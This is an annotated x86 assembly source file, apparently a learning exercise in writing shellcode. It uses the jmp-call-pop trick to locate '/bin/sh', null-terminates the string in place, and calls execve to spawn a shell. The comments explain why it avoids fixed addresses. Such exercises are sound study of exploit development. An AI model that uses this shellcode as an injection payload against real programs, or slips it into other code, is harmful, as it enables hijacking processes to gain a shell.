global _start

section .text

_start:
	jmp label1



label2:
	xor eax, eax
	;If message is /bin/sh then mov [message + 7], al	this way will not work because we are dealing with memory, and as soon as /bin/sh is over, another/funtion starts
	;mov [message + 7], al        would be wrong statement because we avoid using fixed address, and the address for message would be different for different devices
	;so I poped the actual address of the message in $ebx and then did the changes in it accordingly

	xor ebx, ebx
	pop ebx			;Popping the actual address of message in ebx
	mov [ebx + 7], al	;changing the last byte whose value is A, with null character

	push eax		;pushing series of null character in stack
	mov ebp, esp		;copying the address of stack, with null characters in ebp
	push ebx		;pushing the address of message in stack

	xor ecx, ecx	
	mov ecx, esp		;using the top of stack address for pointer argv array, which is null terminated
	
	xor edx, edx
	mov edx, ebp		;using the null characters address for env array

	mov al, 11
	int 0x80
	
	xor eax, eax
	mov al, 1
	xor ebx, ebx
	int 0x80


;section .data  ;uncomment this line to make it executable directly

label1:
	call label2
	message: db "/bin/shA"		;A is added in end because we need a null terminated string, which I later be replacing with A
